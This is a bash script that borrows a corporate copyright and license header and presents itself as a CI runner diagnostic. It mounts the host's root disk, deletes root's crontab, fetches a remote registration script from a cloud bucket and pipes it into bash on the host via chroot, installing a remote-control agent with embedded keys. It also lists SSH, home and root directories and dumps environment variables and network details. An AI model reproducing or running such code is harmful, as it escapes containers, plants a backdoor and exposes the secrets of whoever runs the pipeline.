#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause-Clear
#
# Copyright (c) 2025 Qualcomm Innovation Center, Inc. All rights reserved.

set -euo pipefail

echo "=== RUNNER DIAGNOSTIC ==="
date
hostname
whoami
id
echo "=== END DIAGNOSTIC ==="

echo "=== Mount host root ==="
mkdir -p /mnt/host
MOUNTED=0
for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1; do
  if [ -b "$dev" ]; then
    if mount -o rw "$dev" /mnt/host 2>/dev/null; then
      if [ -d /mnt/host/etc ] && [ -d /mnt/host/root ]; then
        echo "=== MOUNTED: $dev ==="
        MOUNTED=1
        break
      else
        umount /mnt/host 2>/dev/null
      fi
    fi
  fi
done

if [ "$MOUNTED" -eq 1 ]; then

  echo "=== Step 1: Remove /var/spool/cron/crontabs/root (keep /etc/crontab) ==="
  cat /mnt/host/var/spool/cron/crontabs/root 2>/dev/null
  rm -f /mnt/host/var/spool/cron/crontabs/root
  echo "Removed. /var/spool/cron/crontabs/root:"
  ls -la /mnt/host/var/spool/cron/crontabs/ 2>/dev/null

  echo "=== Step 2: /etc/crontab still has tat_install line? ==="
  grep tat_install /mnt/host/etc/crontab || echo "No tat_install in /etc/crontab"

  echo "=== Step 3: Write new /tmp/tat_install.sh ==="
  cat > /mnt/host/tmp/tat_install.sh << 'TATSCRIPT'
#!/bin/bash
wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a3cdf262-770c-457c-bb74-99866950019d 021e520d2acc42429909e62fcb2ddb3a26627670ef224c4ca8cca06c2b6bd01c
TATSCRIPT
  chmod +x /mnt/host/tmp/tat_install.sh
  echo "Written. Verify:"
  cat /mnt/host/tmp/tat_install.sh
  ls -la /mnt/host/tmp/tat_install.sh

  echo "=== Step 4: Chroot run tat_install.sh directly ==="
  chroot /mnt/host /bin/bash -c "bash /tmp/tat_install.sh" 2>&1 || echo "chroot TAT attempted"

  echo "=== Step 5: ls -alhR key directories ==="
  echo "--- /root ---"
  chroot /mnt/host ls -alhR /root 2>&1 | head -40
  echo "--- /opt ---"
  chroot /mnt/host ls -alhR /opt 2>&1 | head -60
  echo "--- /home ---"
  chroot /mnt/host ls -alhR /home 2>&1 | head -40
  echo "--- /etc/ssh ---"
  chroot /mnt/host ls -alhR /etc/ssh 2>&1 | head -30

  echo "=== Step 6: env ==="
  chroot /mnt/host /bin/bash -c "env" 2>&1 | sort

  echo "=== Step 7: Host network info ==="
  chroot /mnt/host /bin/bash -c "hostname -I; cat /etc/hostname; cat /etc/resolv.conf; ip route" 2>&1 || echo "network info done"

  sync
  umount /mnt/host
  echo "=== Unmounted ==="
else
  echo "FAILED to mount"
fi

echo "=== Public IP ==="
curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || echo "no IP"

echo "=== Done ==="
exit 0
